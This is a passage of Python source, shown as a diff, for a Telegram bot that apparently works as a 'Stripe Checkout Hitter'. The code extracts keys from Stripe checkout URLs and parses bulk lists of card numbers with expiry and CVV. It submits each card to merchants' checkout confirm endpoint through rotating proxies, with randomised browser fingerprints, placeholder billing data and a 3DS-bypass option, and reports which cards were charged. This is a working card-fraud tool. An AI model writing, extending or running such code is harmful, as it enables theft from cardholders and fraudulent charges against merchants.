+    return "N/A"
+
+async def get_proxy_info_stripe(proxy_str: str = None, timeout: int = 10) -> dict:
+    result = {
+        "status": "dead",
+        "ip": None,
+        "ip_obfuscated": None,
+        "country": None,
+        "city": None,
+        "org": None,
+        "using_proxy": False
+    }
+    
+    proxy_url = None
+    if proxy_str:
+        proxy_url = get_proxy_url(proxy_str)
+        result["using_proxy"] = True
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
+            if proxy_url:
+                kwargs["proxy"] = proxy_url
+            
+            async with session.get("http://ip-api.com/json", **kwargs) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    result["status"] = "alive"
+                    result["ip"] = data.get("query")
+                    result["ip_obfuscated"] = obfuscate_ip(data.get("query"))
+                    result["country"] = data.get("country")
+                    result["city"] = data.get("city")
+                    result["org"] = data.get("isp")
+    except:
+        result["status"] = "dead"
+    
+    return result
+
+async def check_proxy_alive_stripe(proxy_str: str, timeout: int = 10) -> dict:
+    result = {
+        "proxy": proxy_str,
+        "status": "dead",
+        "response_time": None,
+        "external_ip": None,
+        "error": None
+    }
+    
+    proxy_url = get_proxy_url(proxy_str)
+    if not proxy_url:
+        result["error"] = "Invalid format"
+        return result
+    
+    try:
+        start = time.perf_counter()
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                "http://ip-api.com/json",
+                proxy=proxy_url,
+                timeout=aiohttp.ClientTimeout(total=timeout)
+            ) as resp:
+                elapsed = round((time.perf_counter() - start) * 1000, 2)
+                if resp.status == 200:
+                    data = await resp.json()
+                    result["status"] = "alive"
+                    result["response_time"] = f"{elapsed}ms"
+                    result["external_ip"] = data.get("query")
+    except asyncio.TimeoutError:
+        result["error"] = "Timeout"
+    except Exception as e:
+        result["error"] = str(e)[:30]
+    
+    return result
+
+async def check_proxies_batch_stripe(proxies: list, max_threads: int = 10) -> list:
+    semaphore = asyncio.Semaphore(max_threads)
+    
+    async def check_with_semaphore(proxy):
+        async with semaphore:
+            return await check_proxy_alive_stripe(proxy)
+    
+    tasks = [check_with_semaphore(p) for p in proxies]
+    return await asyncio.gather(*tasks)
+
+_stripe_session = None
+
+async def get_stripe_session():
+    global _stripe_session
+    if _stripe_session is None or _stripe_session.closed:
+        _stripe_session = aiohttp.ClientSession(
+            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
+            timeout=aiohttp.ClientTimeout(total=20, connect=5)
+        )
+    return _stripe_session
+
+def extract_checkout_url(text: str) -> str:
+    patterns = [
+        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
+        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
+        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
+    ]
+    for p in patterns:
+        m = re.search(p, text, re.IGNORECASE)
+        if m:
+            url = m.group(0).rstrip('.,;:')
+            return url
+    return None
+
+def decode_pk_from_url(url: str) -> dict:
+    result = {"pk": None, "cs": None, "site": None}
+    
+    try:
+        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
+        if cs_match:
+            result["cs"] = cs_match.group(0)
+        
+        if '#' not in url:
+            return result
+        
+        hash_part = url.split('#')[1]
+        hash_decoded = unquote(hash_part)
+        
+        try:
+            decoded_bytes = base64.b64decode(hash_decoded)
+            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
+            
+            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
+            if pk_match:
+                result["pk"] = pk_match.group(0)
+            
+            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
+            if site_match:
+                result["site"] = site_match.group(0)
+        except:
+            pass
+            
+    except:
+        pass
+    
+    return result
+
+def parse_card(text: str) -> dict:
+    text = text.strip()
+    parts = re.split(r'[|:/\\\-\s]+', text)
+    if len(parts) < 4:
+        return None
+    cc = re.sub(r'\D', '', parts[0])
+    if not (15 <= len(cc) <= 19):
+        return None
+    month = parts[1].strip()
+    if len(month) == 1:
+        month = f"0{month}"
+    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
+        return None
+    year = parts[2].strip()
+    if len(year) == 4:
+        year = year[2:]
+    if len(year) != 2:
+        return None
+    cvv = re.sub(r'\D', '', parts[3])
+    if not (3 <= len(cvv) <= 4):
+        return None
+    return {"cc": cc, "month": month, "year": year, "cvv": cvv}
+
+def parse_cards(text: str) -> list:
+    cards = []
+    for line in text.strip().split('\n'):
+        line = line.strip()
+        if line:
+            card = parse_card(line)
+            if card:
+                cards.append(card)
+    return cards
+
+def get_currency_symbol(currency: str) -> str:
+    symbols = {
+        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
+        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
+        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
+        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
+        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
+        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
+    }
+    return symbols.get(currency, "")
+
+async def get_checkout_info_stripe(url: str) -> dict:
+    start = time.perf_counter()
+    result = {
+        "url": url,
+        "pk": None,
+        "cs": None,
+        "merchant": None,
+        "price": None,
+        "currency": None,
+        "product": None,
+        "country": None,
+        "mode": None,
+        "customer_name": None,
+        "customer_email": None,
+        "support_email": None,
+        "support_phone": None,
+        "cards_accepted": None,
+        "success_url": None,
+        "cancel_url": None,
+        "init_data": None,
+        "error": None,
+        "time": 0
+    }
+    
+    try:
+        decoded = decode_pk_from_url(url)
+        result["pk"] = decoded.get("pk")
+        result["cs"] = decoded.get("cs")
+        
+        if result["pk"] and result["cs"]:
+            s = await get_stripe_session()
+            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
+            
+            async with s.post(
+                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
+                headers=STRIPE_HITTER_HEADERS,
+                data=body
+            ) as r:
+                init_data = await r.json()
+            
+            if "error" not in init_data:
+                result["init_data"] = init_data
+                
+                acc = init_data.get("account_settings", {})
+                result["merchant"] = acc.get("display_name") or acc.get("business_name")
+                result["support_email"] = acc.get("support_email")
+                result["support_phone"] = acc.get("support_phone")
+                result["country"] = acc.get("country")
+                
+                lig = init_data.get("line_item_group")
+                inv = init_data.get("invoice")
+                if lig:
+                    result["price"] = lig.get("total", 0) / 100
+                    result["currency"] = lig.get("currency", "").upper()
+                    if lig.get("line_items"):
+                        items = lig["line_items"]
+                        currency = lig.get("currency", "").upper()
+                        sym = get_currency_symbol(currency)
+                        product_parts = []
+                        for item in items:
+                            qty = item.get("quantity", 1)
+                            name = item.get("name", "Product")
+                            amt = item.get("amount", 0) / 100
+                            interval = item.get("recurring_interval")
+                            if interval:
+                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
+                            else:
+                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
+                        result["product"] = ", ".join(product_parts)
+                elif inv:
+                    result["price"] = inv.get("total", 0) / 100
+                    result["currency"] = inv.get("currency", "").upper()
+                
+                mode = init_data.get("mode", "")
+                if mode:
+                    result["mode"] = mode.upper()
+                elif init_data.get("subscription"):
+                    result["mode"] = "SUBSCRIPTION"
+                else:
+                    result["mode"] = "PAYMENT"
+                
+                cust = init_data.get("customer") or {}
+                result["customer_name"] = cust.get("name")
+                result["customer_email"] = init_data.get("customer_email") or cust.get("email")
+                
+                pm_types = init_data.get("payment_method_types") or []
+                if pm_types:
+                    cards = [t.upper() for t in pm_types if t != "card"]
+                    if "card" in pm_types:
+                        cards.insert(0, "CARD")
+                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
+                
+                result["success_url"] = init_data.get("success_url")
+                result["cancel_url"] = init_data.get("cancel_url")
+            else:
+                result["error"] = init_data.get("error", {}).get("message", "Init failed")
+        else:
+            result["error"] = "Could not decode PK/CS from URL"
+            
+    except Exception as e:
+        result["error"] = str(e)
+    
+    result["time"] = round(time.perf_counter() - start, 2)
+    return result
+
+async def charge_card_stripe(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
+    start = time.perf_counter()
+    result = {
+        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
+        "status": None,
+        "response": None,
+        "time": 0
+    }
+
+    pk = checkout_data.get("pk")
+    cs = checkout_data.get("cs")
+    init_data = checkout_data.get("init_data")
+
+    if not pk or not cs or not init_data:
+        result["status"] = "FAILED"
+        result["response"] = "No checkout data"
+        result["time"] = round(time.perf_counter() - start, 2)
+        return result
+
+    for attempt in range(max_retries + 1):
+        try:
+            fp = rand_profile()
+            guid = str(uuid.uuid4()) + "".join(random.choices(string.hexdigits.lower(), k=6))
+            muid = str(uuid.uuid4()) + "".join(random.choices(string.hexdigits.lower(), k=7))
+            sid = str(uuid.uuid4()) + "".join(random.choices(string.hexdigits.lower(), k=7))
+            sess_id = str(uuid.uuid4())
+            elem_sess = f"elements_session_{uuid.uuid4().hex[:11]}"
+            config_id = str(uuid.uuid4())
+
+            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
+
+            email = init_data.get("customer_email") or "john@example.com"
+            checksum = init_data.get("init_checksum", "")
+
+            lig = init_data.get("line_item_group")
+            inv = init_data.get("invoice")
+            if lig:
+                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
+            elif inv:
+                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
+            else:
+                pi = init_data.get("payment_intent") or {}
+                total = subtotal = pi.get("amount", 0)
+
+            cust = init_data.get("customer") or {}
+            addr = cust.get("address") or {}
+            name = cust.get("name") or "John Smith"
+            country = addr.get("country") or "US"
+            line1 = addr.get("line1") or "476 West White Mountain Blvd"
+            city = addr.get("city") or "Pinetop"
+            state = addr.get("state") or "AZ"
+            zip_code = addr.get("postal_code") or "85929"
+
+            confirm_params = [
+                ("eid", "NA"),
+                ("payment_method_data[type]", "card"),
+                ("payment_method_data[card][number]", card["cc"]),
+                ("payment_method_data[card][cvc]", card["cvv"]),
+                ("payment_method_data[card][exp_month]", card["month"]),
+                ("payment_method_data[card][exp_year]", card["year"]),
+                ("payment_method_data[allow_redisplay]", "unspecified"),
+                ("payment_method_data[billing_details][name]", name),
+                ("payment_method_data[billing_details][email]", email),
+                ("payment_method_data[billing_details][address][country]", country),
+                ("payment_method_data[billing_details][address][line1]", line1),
+                ("payment_method_data[billing_details][address][city]", city),
+                ("payment_method_data[billing_details][address][state]", state),
+                ("payment_method_data[billing_details][address][postal_code]", zip_code),
+                ("payment_method_data[pasted_fields]", "number"),
+                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; payment-element"),
+                ("payment_method_data[referrer]", "https://merchant.example.com"),
+                ("payment_method_data[time_on_page]", str(random.randint(30000, 200000))),
+                ("payment_method_data[client_attribution_metadata][client_session_id]", sess_id),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_source]", "elements"),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_subtype]", "payment-element"),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_version]", "2021"),
+                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "standard"),
+                ("payment_method_data[client_attribution_metadata][payment_method_selection_flow]", "automatic"),
+                ("payment_method_data[client_attribution_metadata][elements_session_id]", elem_sess),
+                ("payment_method_data[client_attribution_metadata][elements_session_config_id]", config_id),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "payment"),
+                ("payment_method_data[guid]", guid),
+                ("payment_method_data[muid]", muid),
+                ("payment_method_data[sid]", sid),
+                ("expected_amount", str(total)),
+                ("last_displayed_line_item_group_details[subtotal]", str(subtotal)),
+                ("last_displayed_line_item_group_details[total_exclusive_tax]", "0"),
+                ("last_displayed_line_item_group_details[total_inclusive_tax]", "0"),
+                ("last_displayed_line_item_group_details[total_discount_amount]", "0"),
+                ("last_displayed_line_item_group_details[shipping_rate_amount]", "0"),
+                ("expected_payment_method_type", "card"),
+                ("key", pk),
+                ("init_checksum", checksum),
+            ]
+
+            if bypass_3ds:
+                confirm_params.append(("return_url", "https://checkout.stripe.com"))
+
+            elements_headers = {
+                "Accept": "application/json",
+                "Accept-Language": fp["lang"],
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://js.stripe.com",
+                "Referer": "https://js.stripe.com/",
+                "sec-ch-ua": fp["sec_ch_ua"],
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": fp["platform"],
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site",
+                "User-Agent": fp["ua"],
+                "priority": "u=1, i",
+                "dnt": "1",
+            }
+
+            body = urlencode(confirm_params)
+            connector = aiohttp.TCPConnector(limit=100, ssl=False)
+            async with aiohttp.ClientSession(connector=connector) as s:
+                async with s.post(
+                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                    headers=elements_headers,
+                    data=body,
+                    proxy=proxy_url
+                ) as r:
+                    conf = await r.json()
+
+            if "error" in conf:
+                err = conf["error"]
+                dc = err.get("decline_code", "")
+                msg = err.get("message", "Failed")
+                if "unsupported" in msg.lower() or "tokenization" in msg.lower():
+                    result["status"] = "NOT SUPPORTED"
+                    result["response"] = "Checkout not supported"
+                else:
+                    result["status"] = "DECLINED"
+                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
+            else:
+                pi = conf.get("payment_intent") or {}
+                st = pi.get("status", "") or conf.get("status", "")
+                if st == "succeeded":
+                    result["status"] = "CHARGED"
+                    result["response"] = "Payment Successful"
+                elif st == "requires_action":
+                    if bypass_3ds:
+                        result["status"] = "3DS SKIP"
+                        result["response"] = "3DS Cannot be bypassed"
+                    else:
+                        result["status"] = "3DS"
+                        result["response"] = "3DS Required"
+                elif st == "requires_payment_method":
+                    result["status"] = "DECLINED"
+                    result["response"] = "Card Declined"
+                else:
+                    result["status"] = "UNKNOWN"
+                    result["response"] = st or "Unknown"
+
+            result["time"] = round(time.perf_counter() - start, 2)
+            return result
+
+        except Exception as e:
+            err_str = str(e)
+            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
+                await asyncio.sleep(1)
+                continue
+            result["status"] = "ERROR"
+            result["response"] = err_str[:50]
+            result["time"] = round(time.perf_counter() - start, 2)
+            return result
+
+    return result
+
+async def check_checkout_active_stripe(pk: str, cs: str) -> bool:
+    try:
+        s = await get_stripe_session()
+        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
+        async with s.post(
+            f"https://api.stripe.com/v1/payment_pages/{cs}/init",
+            headers=STRIPE_HITTER_HEADERS,
+            data=body,
+            timeout=aiohttp.ClientTimeout(total=5)
+        ) as r:
+            data = await r.json()
+            return "error" not in data
+    except:
+        return False
+
+# ============ COMMAND HANDLERS ============
+
+async def addproxy_stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add proxy for Stripe hitter - /addproxy"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    args = context.args
+    
+    PREMIUM_EMOJI_IDS = {
+        "diamond": "5427168083074628963",
+        "skull": "5042167377869932162",
+        "target": "5377336227533969892",
+        "approved": "6266787022111773140",
+        "declined": "6267039884016358504",
+    }
+    
+    def pe(emoji_id, fallback):
+        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+    
+    user_proxies = get_stripe_user_proxies(user_id)
+    
+    if not args:
+        if user_proxies:
+            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
+            if len(user_proxies) > 10:
+                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
+        else:
+            proxy_list = "    • <code>None</code>"
+        
+        await message.reply_text(
+            f"{pe(PREMIUM_EMOJI_IDS['diamond'], '🔒')} <b>Stripe Proxy Manager</b>\n\n"
+            f"📌 <b>Your Proxies ({len(user_proxies)}) :</b>\n{proxy_list}\n\n"
+            f"<b>Commands:</b>\n"
+            f"  /addproxy &lt;proxy&gt; - Add proxy\n"
+            f"  /removeproxy &lt;proxy&gt; - Remove proxy\n"
+            f"  /removeproxy all - Remove all\n"
+            f"  /proxy check - Check all proxies\n\n"
+            f"<b>Formats:</b>\n"
+            f"  • <code>host:port:user:pass</code>\n"
+            f"  • <code>user:pass@host:port</code>\n"
+            f"  • <code>host:port</code>\n\n"
+            f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} <b>Bot</b> ➛ @BLADESARKS_V3bot",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy_input = " ".join(args)
+    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
+    
+    if not proxies_to_add:
+        await message.reply_text("❌ No valid proxies provided.")
+        return
+    
+    checking_msg = await message.reply_text(
+        f"⏳ Checking {len(proxies_to_add)} proxies..."
+    )
+    
+    results = await check_proxies_batch_stripe(proxies_to_add, max_threads=10)
+    
+    alive_proxies = []
+    dead_proxies = []
+    
+    for r in results:
+        if r["status"] == "alive":
+            alive_proxies.append(r)
+            add_stripe_user_proxy(user_id, r["proxy"])
+        else:
+            dead_proxies.append(r)
+    
+    response = f"{pe(PREMIUM_EMOJI_IDS['approved'], '✅')} <b>Proxy Check Complete</b>\n\n"
+    response += f"📊 Alive: <code>{len(alive_proxies)}/{len(proxies_to_add)} ✅</code>\n"
+    response += f"📊 Dead: <code>{len(dead_proxies)}/{len(proxies_to_add)} ❌</code>\n\n"
+    
+    if alive_proxies:
+        response += "<b>Added Proxies:</b>\n"
+        for p in alive_proxies[:5]:
+            response += f"    • <code>{p['proxy']}</code> ({p['response_time']})\n"
+        if len(alive_proxies) > 5:
+            response += f"    • <code>... and {len(alive_proxies) - 5} more</code>\n"
+    
+    response += f"\n{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+    
+    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+
+async def removeproxy_stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Remove proxy for Stripe hitter - /removeproxy"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    args = context.args
+    
+    if not args:
+        await message.reply_text(
+            "🗑️ <b>Remove Proxy</b>\n\n"
+            "Usage: /removeproxy <proxy>\n"
+            "Or: /removeproxy all",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy_input = args[0].strip()
+    
+    if proxy_input.lower() == "all":
+        user_proxies = get_stripe_user_proxies(user_id)
+        count = len(user_proxies)
+        remove_stripe_user_proxy(user_id, "all")
+        await message.reply_text(
+            f"✅ <b>All Proxies Removed</b>\n\n📊 Removed: <code>{count} proxies</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if remove_stripe_user_proxy(user_id, proxy_input):
+        await message.reply_text(
+            f"✅ <b>Proxy Removed</b>\n\nProxy: <code>{proxy_input}</code>",
+            parse_mode=ParseMode.HTML
+        )
+    else:
+        await message.reply_text(
+            f"❌ <b>Proxy Not Found</b>\n\nProxy: <code>{proxy_input}</code>",
+            parse_mode=ParseMode.HTML
+        )
+
+async def proxy_stripe_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check all proxies for Stripe hitter - /proxy check"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    args = context.args
+    
+    user_proxies = get_stripe_user_proxies(user_id)
+    
+    if not user_proxies:
+        await message.reply_text(
+            "❌ <b>No proxies to check</b>\n\nAdd proxies with: /addproxy <proxy>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    checking_msg = await message.reply_text(
+        f"⏳ <b>Checking {len(user_proxies)} proxies...</b>",
+        parse_mode=ParseMode.HTML
+    )
+    
+    results = await check_proxies_batch_stripe(user_proxies, max_threads=10)
+    
+    alive = [r for r in results if r["status"] == "alive"]
+    dead = [r for r in results if r["status"] == "dead"]
+    
+    response = f"📊 <b>Proxy Check Results</b>\n\n"
+    response += f"Alive: <code>{len(alive)}/{len(user_proxies)} ✅</code>\n"
+    response += f"Dead: <code>{len(dead)}/{len(user_proxies)} ❌</code>\n\n"
+    
+    if alive:
+        response += "<b>Alive Proxies:</b>\n"
+        for p in alive[:5]:
+            ip_display = p['external_ip'] or 'N/A'
+            response += f"    • <code>{p['proxy']}</code>\n      IP: {ip_display} | {p['response_time']}\n"
+        if len(alive) > 5:
+            response += f"    • <code>... and {len(alive) - 5} more</code>\n"
+    
+    if dead:
+        response += "\n<b>Dead Proxies:</b>\n"
+        for p in dead[:3]:
+            error = p.get('error', 'Unknown')
+            response += f"    • <code>{p['proxy']}</code> ({error})\n"
+        if len(dead) > 3:
+            response += f"    • <code>... and {len(dead) - 3} more</code>\n"
+    
+    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+
+# ============ STRIPE CHECKOUT HITTER WITH PREMIUM EMOJIS ============
+
+# ============ STRIPE CHECKOUT HITTER WITH PREMIUM EMOJIS - FULL CARD ============
+
+async def co_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stripe Checkout Hitter - /co <url> <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    start_time = time.perf_counter()
+    user_id = update.effective_user.id
+    message = update.effective_message
+    username = update.effective_user.username or update.effective_user.first_name
+    
+    text = message.text or ""
+    lines = text.strip().split('\n')
+    first_line = lines[0] if lines else ""
+    first_line_args = first_line.split(maxsplit=3)
+    
+    if len(first_line_args) < 2:
+        await message.reply_text(
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Stripe Checkout Hitter</b>\n\n"
+            "Usage:\n"
+            "  <code>/co &lt;url&gt;</code> - Get checkout info\n"
+            "  <code>/co &lt;url&gt; &lt;card&gt;</code> - Charge single card\n"
+            "  <code>/co &lt;url&gt; &lt;card1&gt; &lt;card2&gt; ...</code> - Charge multiple\n"
+            "  Reply to .txt file with <code>/co &lt;url&gt;</code>\n\n"
+            "Card format: <code>cc|mm|yy|cvv</code>\n"
+            "Example: <code>/co https://checkout.stripe.com/xxx 4242424242424242|12|26|123</code>\n\n"
+            "Proxy: <code>/addproxy user:pass@host:port</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Extract URL
+    url = extract_checkout_url(first_line_args[1])
+    if not url:
+        url = first_line_args[1].strip()
+    
+    # Parse cards
+    cards = []
+    bypass_3ds = True
+    
+    if len(first_line_args) > 2:
+        if first_line_args[2].lower() in ['yes', 'no']:
+            bypass_3ds = first_line_args[2].lower() == 'yes'
+            if len(first_line_args) > 3:
+                cards = parse_cards(first_line_args[3])
+        else:
+            cards = parse_cards(first_line_args[2])
+    
+    if len(lines) > 1:
+        remaining_text = '\n'.join(lines[1:])
+        cards.extend(parse_cards(remaining_text))
+    
+    if message.reply_to_message and message.reply_to_message.document:
+        doc = message.reply_to_message.document
+        if doc.file_name and doc.file_name.endswith('.txt'):
+            try:
+                file = await context.bot.get_file(doc.file_id)
+                file_content = await file.download_as_bytearray()
+                text_content = file_content.decode('utf-8')
+                cards = parse_cards(text_content)
+            except Exception as e:
+                await message.reply_text(f"❌ Failed to read file: {str(e)[:50]}")
+                return
+    
+    user_proxy = get_stripe_user_proxy(user_id)
+    
+    if not user_proxy:
+        await message.reply_text(
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>No Proxy Found</b>\n\n"
+            "You must set a proxy first:\n"
+            "<code>/addproxy user:pass@host:port</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy_info = await get_proxy_info_stripe(user_proxy)
+    
+    if proxy_info["status"] == "dead":
+        await message.reply_text(
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Proxy is Dead</b>\n\n"
+            f"Your proxy <code>{user_proxy}</code> is not responding.\n"
+            "Check with <code>/proxy check</code> or add a new proxy.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy_display = f"LIVE ✅ | {proxy_info['ip_obfuscated']}"
+    
+    # ============ PREMIUM EMOJI IDs ============
+    PREMIUM_EMOJI_IDS = {
+        "charged": "5039670412733055750",
+        "approved": "6266787022111773140",
+        "declined": "6267039884016358504",
+        "warning": "6267237615720731788",
+        "info": "5042306247047513767",
+        "success": "5041796412954641308",
+        "error": "6282641460093260838",
+        "card": "5472250091332993630",
+        "bank": "5332455502917949981",
+        "money": "5201873447554145566",
+        "lock": "5197288647275071607",
+        "time": "5382194935057372936",
+        "stats": "5028746137645876535",
+        "skull": "5042167377869932162",
+        "target": "5377336227533969892",
+        "diamond": "5427168083074628963",
+        "fire": "5471133374264684999",
+    }
+    
+    def pe(emoji_id, fallback):
+        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+    
+    processing_msg = await message.reply_text(
+        f"{pe(PREMIUM_EMOJI_IDS['time'], '⏳')} <b>Processing Stripe Checkout...</b>\n\n"
+        f"{pe(PREMIUM_EMOJI_IDS['target'], '📍')} <b>Proxy</b> ➛ <code>{proxy_display}</code>\n"
+        f"{pe(PREMIUM_EMOJI_IDS['info'], '📌')} <b>Status</b> ➛ Parsing checkout...",
+        parse_mode=ParseMode.HTML
+    )
+    
+    checkout_data = await get_checkout_info_stripe(url)
+    
+    if checkout_data.get("error"):
+        await processing_msg.edit_text(
+            f"{pe(PREMIUM_EMOJI_IDS['error'], '❌')} <b>Error</b>\n\n{checkout_data['error']}",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not cards:
+        currency = checkout_data.get('currency', '')
+        sym = get_currency_symbol(currency)
+        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
+        total_time = round(time.perf_counter() - start_time, 2)
+        
+        response = f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Stripe Checkout Info</b>\n\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['target'], '📍')} <b>Proxy</b> ➛ <code>{proxy_display}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['info'], '📋')} <b>CS</b> ➛ <code>{checkout_data['cs'] or 'N/A'}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['info'], '🔑')} <b>PK</b> ➛ <code>{checkout_data['pk'] or 'N/A'}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['approved'], '✅')} <b>Status</b> ➛ SUCCESS\n\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['bank'], '🏦')} <b>Merchant</b> ➛ <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Product</b> ➛ <code>{checkout_data['product'] or 'N/A'}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Price</b> ➛ <code>{price_str}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌍')} <b>Country</b> ➛ <code>{checkout_data['country'] or 'N/A'}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['info'], '📌')} <b>Mode</b> ➛ <code>{checkout_data['mode'] or 'N/A'}</code>\n\n"
+        
+        if checkout_data['customer_name'] or checkout_data['customer_email']:
+            response += f"{pe(PREMIUM_EMOJI_IDS['users'], '👤')} <b>Customer</b> ➛ <code>{checkout_data['customer_name'] or 'N/A'}</code>\n"
+            response += f"{pe(PREMIUM_EMOJI_IDS['info'], '📧')} <b>Email</b> ➛ <code>{checkout_data['customer_email'] or 'N/A'}</code>\n\n"
+        
+        if checkout_data['cards_accepted']:
+            response += f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Cards Accepted</b> ➛ <code>{checkout_data['cards_accepted']}</code>\n\n"
+        
+        response += f"{pe(PREMIUM_EMOJI_IDS['target'], '🔗')} <a href=\"{url}\">Open Checkout</a>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} <b>Time</b> ➛ {total_time}s"
+        
+        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+        return
+    
+    bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
+    currency = checkout_data.get('currency', '')
+    sym = get_currency_symbol(currency)
+    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
+    
+    # ============ UPDATED CHARGING MESSAGE WITH PREMIUM EMOJIS ============
+    await processing_msg.edit_text(
+        f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Charging {price_str}</b>\n\n"
+        f"{pe(PREMIUM_EMOJI_IDS['target'], '📍')} <b>Proxy</b> ➛ <code>{proxy_display}</code>\n"
+        f"{pe(PREMIUM_EMOJI_IDS['lock'], '🔓')} <b>Bypass 3DS</b> ➛ <code>{bypass_str}</code>\n"
+        f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Cards</b> ➛ <code>{len(cards)}</code>\n"
+        f"{pe(PREMIUM_EMOJI_IDS['time'], '🔄')} <b>Status</b> ➛ Starting...",
+        parse_mode=ParseMode.HTML
+    )
+    
+    results = []
+    charged_card = None
+    cancelled = False
+    check_interval = 5
+    last_update = time.perf_counter()
+    
+    for i, card in enumerate(cards):
+        if len(cards) > 1 and i > 0 and i % check_interval == 0:
+            is_active = await check_checkout_active_stripe(checkout_data['pk'], checkout_data['cs'])
+            if not is_active:
